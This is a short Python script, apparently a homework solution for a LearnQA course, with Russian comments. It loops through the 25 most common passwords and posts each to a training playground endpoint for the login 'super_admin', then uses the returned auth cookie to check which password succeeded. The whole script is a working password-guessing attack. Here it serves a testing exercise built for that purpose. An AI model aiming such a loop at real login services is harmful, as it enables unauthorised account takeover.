import requests

auth_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = "super_admin"

# Список самых популярных паролей (Top 25 по версии SplashData)
passwords = [
    "123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123",
    "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome",
    "888888", "princess", "dragon", "password1", "123qwe"
]

# Перебор паролей
for password in passwords:
    response = requests.post(auth_url, data={"login": login, "password": password})
    auth_cookie = response.cookies.get("auth_cookie")

    if auth_cookie:
        cookies = {"auth_cookie": auth_cookie}
        check_response = requests.get(check_url, cookies=cookies)

        if check_response.text != "You are NOT authorized":
            print(f"Верный пароль найден: {password}")
            print(f"Ответ сервера: {check_response.text}")
            break
